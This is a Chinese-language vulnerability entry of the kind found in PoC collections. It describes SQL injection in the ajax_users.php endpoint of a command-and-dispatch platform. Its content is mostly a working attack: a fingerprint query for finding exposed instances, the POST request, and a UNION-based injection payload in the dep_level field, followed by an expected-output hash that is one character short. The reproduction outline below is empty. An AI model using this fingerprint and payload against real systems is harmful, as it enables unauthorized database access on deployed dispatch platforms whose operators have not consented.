# 指挥调度平台ajax_users存在SQL注入漏洞

- **系统**：指挥调度平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /app/ext/ajax_users.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
e10adc3949ba59abbe56e057f20f883
```

**其他**
- 指挥调度平台ajax\_users存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台